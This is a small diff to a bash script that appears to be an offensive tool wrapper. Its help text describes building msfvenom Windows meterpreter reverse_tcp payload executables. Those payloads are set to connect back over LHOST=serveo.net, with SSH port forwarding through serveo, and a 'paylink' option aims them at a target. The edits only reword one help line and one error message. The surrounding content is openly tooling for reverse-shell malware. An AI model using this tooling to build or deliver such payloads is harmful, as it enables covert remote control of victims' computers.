@@ -82,7 +82,7 @@ Arguments  |    options     |    Description
 ╰──payexe──➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
 |               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
 |                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
-|                             LHOST=serveo.net apk=outlan.apk
+|                             LHOST=serveo.net file=outlan.exe
 ╰─serveo───➤────────────────➤ Start a SSH client to request TCP port forwarding from the server and proxy
 |    ╰─────➤────domain──────➤ Start a SSH client to request port forwarding with especific dns\n\n"
 elif [ $1 = list ]; then
@@ -249,7 +249,7 @@ elif [ $1 = payexe ] && [ $2 ]; then
                 printf "$R[w]->$W invalid option\n"
         fi
 elif [ $1 = paylink ] && [ -z $2 ]; then
-	printf "$R[w]->$W pc options need a target\n"
+	printf "$R[w]->$W paylink argument need an option and target\n"
 elif [ $1 = paylink ] && [ $2 = pc ] && [ -z $3 ]; then
 	printf "$R[w]->$W pc options need a target\n"
 elif [ $1 = paylink ] && [ $2 = pc ] && [ $3 ]; then
